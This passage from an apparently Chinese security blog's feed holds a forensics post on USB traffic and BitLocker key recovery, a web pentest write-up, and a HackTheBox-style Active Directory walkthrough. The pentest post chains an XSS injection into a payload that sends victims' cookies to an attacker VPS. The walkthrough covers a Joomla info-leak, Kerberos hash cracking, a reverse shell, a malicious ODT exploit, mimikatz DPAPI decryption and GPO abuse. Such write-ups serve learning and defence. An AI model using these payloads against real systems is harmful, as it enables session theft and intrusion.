中，就可以复原鼠标行动轨迹</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-27.png" class="" title="2024-03-25_11-27.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>当然对于鼠标usb的取证也有一些脚本可以使用，比如 <a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a></p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-54.png" class="" title="2024-03-25_10-54.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_19-42.png" class="" title="2024-03-25_19-42.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>对于键盘流量取证，键盘数据包的数据长度为8个字节，和击键信息被集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet,通过下面这张图可以找到这个值与具体键位的对应关系</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-00.png" class="" title="2024-03-25_11-00.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><h2 id="windows系统下Bitlocker加密问题"><a href="#windows系统下Bitlocker加密问题" class="headerlink" title="windows系统下Bitlocker加密问题"></a>windows系统下Bitlocker加密问题</h2><p>Windows专业版&#x2F;企业版&#x2F;教育版的操作系统支持开启和使用Bitlocker加密，而家庭版不支持，不过家庭版可以通过”设备加密”那里启动磁盘保护，启动Bitlocker的方式为：控制面板-&gt;Bitlocker驱动器加密-&gt;启用Bitlocker</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-160737.png" class="" title="2024-03-24-160737.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>对于加密，有三种解锁方式可选，分别是使用密码解锁、使用智能卡解锁以及在此计算机上自动解锁，不过有些系统版本只显示两种，比如我的</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-160838.png" class="" title="2024-03-24-160838.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-160938.png" class="" title="2024-03-24-160938.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>Bitlocker加密后的表现，会显示有一把锁标志</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-161223.png" class="" title="2024-03-24-161223.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>如果想查属于哪种加密类型，可通过manage-bde管理工具来查看Bitlocker保护类型</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">manage-bde-<span class="hljs-keyword">status</span> x:<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-161343.png" class="" title="2024-03-24-161343.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>被Bitlocker保护的驱动器，其DBR特征非常明显，通过XWF或者winhex可查看标志头位，典型特征：“FVE-FS”</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-170846.png" class="" title="2024-03-24-170846.png"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>而不同磁盘的标志头位是”NTFS”</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-170907.png" class="" title="2024-03-24-170907.png"><h6 id="-36"><a href="#-36" class="headerlink" title=""></a></h6><p>对于启用Bitlocker保护的硬盘在进行证据固定时不可做全盘镜像，因为做下来的镜像还是加密状态，如果以物理驱动器的方式将整块硬盘添加到案件中，是可以明显看到硬盘处于Bitlocker加密状态</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-171406.png" class="" title="2024-03-24-171406.png"><h6 id="-37"><a href="#-37" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-171456.png" class="" title="2024-03-24-171456.png"><h6 id="-38"><a href="#-38" class="headerlink" title=""></a></h6><p>但是如果以添加逻辑驱动器的形式将分区添加到案件中，是可以解析出完整的分区结构和目录的，所以在不知道密码或者恢复密钥的情况下，是无法对硬盘镜像进行解密的</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-171820.png" class="" title="2024-03-24-171820.png"><h6 id="-39"><a href="#-39" class="headerlink" title=""></a></h6><p>那我们怎么得到恢复密钥？在系统下可直接使用manage-bde将加密卷的恢复密钥读取出来</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">manage-bde -protectors -<span class="hljs-built_in">get</span> x:<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172013.png" class="" title="2024-03-24-172013.png"><h6 id="-40"><a href="#-40" class="headerlink" title=""></a></h6><p>有时候，常规手段不行那就上强度，爆破！推荐Passware Kit Forensic</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172619.png" class="" title="2024-03-24-172619.png"><h6 id="-41"><a href="#-41" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172634.png" class="" title="2024-03-24-172634.png"><h6 id="-42"><a href="#-42" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172656.png" class="" title="2024-03-24-172656.png"><h6 id="-43"><a href="#-43" class="headerlink" title=""></a></h6><p>或者也可以从内存中提取密钥，现在假设一个情况: 涉案机器处于开机状态且允许进入桌面，这个时候内存中会包含大量有价值的数据，比如软件进程，网络连接情况还有历史系统命令操作记录等等，易失性数据要优先固定留存，方便后面的取证工作，这个时候我们通过分析内存镜像尝试寻找Bitlocker的密钥数据，可以借助Elcomsoft Forensic Disk Decryptor工具，它支持导出内存镜像中的各种密钥数据，当然也可以直接进行破解任务</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-173156.png" class="" title="2024-03-24-173156.png"><h6 id="-44"><a href="#-44" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-173302.png" class="" title="2024-03-24-173302.png"><h6 id="-45"><a href="#-45" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24_17-41.png" class="" title="2024-03-24_17-41.png"><h6 id="-46"><a href="#-46" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>数字取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次通过组合拳拿到cookie的学习记录</title>
    <link href="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>开局一人一狗一刀999：发现在主页网址上加入h2标签时，参数会在页面显示</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-10.png" class="" title="2024-03-23_23-10.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>查看网页源代码还是发现了点东西</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-06.png" class="" title="2024-03-23_23-06.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>通过审计，发现这段代码运用了混淆和压缩</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-08.png" class="" title="2024-03-23_23-08.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>这时候进行输出测试，输出v&#x3D;liuty，可以看到已经写到了js代码中，并且进行了压缩</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-09.png" class="" title="2024-03-23_23-09.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>然后尝试将alert添加到里面并进行测试：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-comment">;alert(9)//</span><br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-12.png" class="" title="2024-03-23_23-12.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>发现可以成功写入，在主页进行测试xss漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v</span>=<span class="hljs-number">1</span>));alert(<span class="hljs-number">1</span>);//%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-17.png" class="" title="2024-03-23_23-17.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>既然xss没问题，试试是否可以ssrf</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;/vendor/analytics.min.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;/assets/js/analytics.min.js?v=1));document.location=`https://vps&#x27;</span><span class="hljs-attr">s</span> <span class="hljs-attr">IP</span>/<span class="hljs-attr">liuty</span>`;//&#x27;&lt;/<span class="hljs-attr">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-21.png" class="" title="2024-03-23_23-21.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-22.png" class="" title="2024-03-23_23-22.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>成功反弹读取目录的信息，看来是有戏，然后尝试结合xss跟ssrf，打cookie，目标子域有一个后台客服咨询，既然是个交互点，进行尝试</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-26.png" class="" title="2024-03-23_23-26.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; url=http://xxxxx/&lt;script+src=&#x27;/vendor/analytics.min.js&#x27;&gt;&lt;/script&gt;&lt;script+src=&#x27;/assets/js/analytics.min.js?v=1));document.location=`https://vps&#x27;s IP/<span class="hljs-variable">$&#123;document.cookie&#125;</span>`;//&#x27;&lt;/script&gt;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-34.png" class="" title="2024-03-23_23-34.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>成功拿到cookie，一看就是JWT编码，进行解码</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-49.png" class="" title="2024-03-23_23-49.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梦中的一次HTB</title>
    <link href="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/"/>
    <url>/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/</url>
    
    <content type="html"><![CDATA[<p>这几天又做梦了 梦到了…</p><p>当前机子的80端口是一个Joomla，并且发现了版本号为4.2.7，存在Joomla未授权访问漏洞(CVE-2023-23752)</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/api/i</span>ndex.php<span class="hljs-regexp">/v1/</span>config/application?<span class="hljs-keyword">public</span>=<span class="hljs-keyword">true</span>​<br></code></pre></td></tr></table></figure><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-14.png" class="" title="2024-03-12_15-14.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>泄露用户名密码，并且在前期内网信息收集的过程中可知，22端口没有开放不过开放了445,所以从smb入手</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-27.png" class="" title="2024-03-12_15-27.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>发现用户名密码不正确，猜测可能是用户名不正确，尝试使用AS-REP攻击，使用kerbrute对目标域名进行用户名枚举</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-28.png" class="" title="2024-03-12_15-28.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>逐个尝试，发现一个用户能够成功连接，并且在查看共享文件夹内容时，发现在SOC Analysis文件夹中有一个pcap文件，get下来</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-37.png" class="" title="2024-03-12_15-37.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_17-32.png" class="" title="2024-03-12_17-32.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>分析这个流量包，不管是tcp或者是udp流，都没有发现异常流量，但是发现了存在Kerberos流量</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_17-36.png" class="" title="2024-03-12_17-36.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>不过在第二个数据包中，还是发现了点东西，并且发现了一个用户</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_17-44.png" class="" title="2024-03-12_17-44.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>首先在cipher那里那里可以看到hash的类型，是一个是krb类型，流量包中的加密模式为18，并且为SHA-256，能够破解Kerberos的方式为7500，但是7500模式中的加密模式为23而并非18，而19900模式是能够破解Kerberos，并且加密模式正好是18，所以我们用hashcat进行破解，首先构造密文，Krb5pa标识kerberos5预身份验证，18标识kerberos加密类型18(AES-256)，后面追加用户名和域名，均用$符合隔开</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$krb5pa</span><span class="hljs-variable">$18</span><span class="hljs-variable">$用</span>户名<span class="hljs-variable">$域</span>名<span class="hljs-variable">$hash</span><br></code></pre></td></tr></table></figure><p>保存到一个txt中，再用hashcat进行破解，命令如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">19900</span> hash.txt 字典.txt<br></code></pre></td></tr></table></figure><p>破解出来之后，进行登录Joomla，查找功能点，发现在system-&gt;site Templates可以修改主页代码，修改为反弹shell代码</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_20-50.png" class="" title="2024-03-12_20-50.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>拿shell</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_20-52.png" class="" title="2024-03-12_20-52.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>为了方便后边的操作，上线msf，拿到一个会话之后，随即迁移进程，并使用runas模块提权到刚才流量包中发现的账户</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-21.png" class="" title="2024-03-12_21-21.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-23.png" class="" title="2024-03-12_21-23.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>成功拿到用户权限，查看端口开放情况</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-25.png" class="" title="2024-03-12_21-25.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>发现开放了8083端口，通过端口转发将其流量代理出来</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-48.png" class="" title="2024-03-12_21-48.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>代理出来之后发现了文件上传点，随便上传了几个文件进行探测，发现对文件类型有限制，其中可以上传odt文件</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_08-29.png" class="" title="2024-03-13_08-29.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_08-28.png" class="" title="2024-03-13_08-28.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>这里我们利用odt文件的漏洞（CVE-2023-2255），首先生成一个exe马，然后制作一个odt恶意文件，让这个odt去执行cmd命令从而执行exe木马，msf监听接收shell</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_10-22.png" class="" title="2024-03-13_10-22.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>获取到新的shell，此时用户已经变为域中的其他用户，开始进行横向移动，首先查看当前还有什么用户</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-15.png" class="" title="2024-03-13_20-15.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>用mimikatz查看凭据信息</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-20.png" class="" title="2024-03-13_20-20.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>列出了当前用户的windows凭据保管库内容和Windows Credentials凭据，然后逐一寻找受保护的凭据内容</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">dir /<span class="hljs-name">a</span>:h <span class="hljs-name">C</span>:\Users\PPotts\AppData\Local\Microsoft\Credentials\<br>dir /<span class="hljs-name">a</span>:h <span class="hljs-name">C</span>:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\<br>Get-ChildItem -Hidden <span class="hljs-name">C</span>:\Users\PPotts\AppData\Local\Microsoft\Credentials\<br>Get-ChildItem -Hidden <span class="hljs-name">C</span>:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\<br></code></pre></td></tr></table></figure><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-21.png" class="" title="2024-03-13_20-21.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>可以看到有三个不同cred，回到mimikatz使用dpapi::cred模块来解密存储在Windows数据保护API（DPAPI）下的凭据，尝试解密位于当前用户的Credentials目录下的一个加密凭据文件。以便查找数据</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-23.png" class="" title="2024-03-13_20-23.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-30.png" class="" title="2024-03-13_20-30.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-31.png" class="" title="2024-03-13_20-31.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>一般情况下，用于加密用户RSA密钥的DPAPI密钥存储在%APPDATA%\Microsoft\Protect\ {SID}目录下，其中{SID}是该用户的，DPAPI 密钥与保护用户私钥的主密钥存储在同一文件中，通常是64字节的随机数据，列出当前用户AppData\Roaming\Microsoft\Protect\下的所有内容（此处为该用户的sid）</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-16.png" class="" title="2024-03-14_09-16.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>继续列出当前用户sid下的所有隐藏内容</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-16_1.png" class="" title="2024-03-14_09-16_1.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>接下来使用mimikatz的dpapi::masterkey模块来解密最新的主密钥</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-19.png" class="" title="2024-03-14_09-19.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>这个时候域控已为我们解密，直接将mimikatz打进缓存</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-19_1.png" class="" title="2024-03-14_09-19_1.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>使用缓存中的密钥，我们可以恢复查看凭证文件，得到了新的用户名和密码</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-21.png" class="" title="2024-03-14_09-21.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>横向到新用户，尝试使用winrm登录，成功</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-24.png" class="" title="2024-03-14_09-24.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>因为一直没有拿下超管权限，很多操作还是受限，接下来寻找提权的方法，在开始之前先用Bloodhound导出所有域之间的所有关联数据</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_20-55.png" class="" title="2024-03-14_20-55.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-15_08-32.png" class="" title="2024-03-15_08-32.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-15_08-42.png" class="" title="2024-03-15_08-42.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>不难发现当前横向到的这个用户是位于GPO组内的，而GPO Manager组成员很可能被授予了修改、创建或链接组策略对象的权限，由于GPO <a href="mailto:&#x4d;&#x41;&#78;&#x45;&#x52;&#71;&#x45;&#82;&#x53;&#64;&#79;&#70;&#x46;&#73;&#x43;&#x45;&#x2e;&#72;&#84;&#66;">&#x4d;&#x41;&#78;&#x45;&#x52;&#71;&#x45;&#82;&#x53;&#64;&#79;&#70;&#x46;&#73;&#x43;&#x45;&#x2e;&#72;&#84;&#66;</a>这个组为AD中的安全组，因此可能可以利用GPO来进行横向移动，于是列出域中的所有GPO</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-11.png" class="" title="2024-03-14_10-11.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><p>这个时候就有思路了，使用SharpGPOAbuse在Active Directory环境中通过修改“Default Domain Controllers Policy”这个组策略对象，将当前用户账户添加为所有受此GPO影响的域控本地管理员，使得当前用户获得对这些域控制器的高级访问权限</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-34.png" class="" title="2024-03-14_10-34.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>强制更新组策略</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-35.png" class="" title="2024-03-14_10-35.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>现在再查看administrators组用户成员，可以发现当前用户属性，已经在administrators里面，这样一来就拥有了administrator权限，提权成功 拿下！</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_10-40.png" class="" title="2024-03-14_10-40.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>醒了…原来终究是一场梦罢了</p><p>起床.<br>吃早饭..<br>摸鱼的一天又开始了…</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
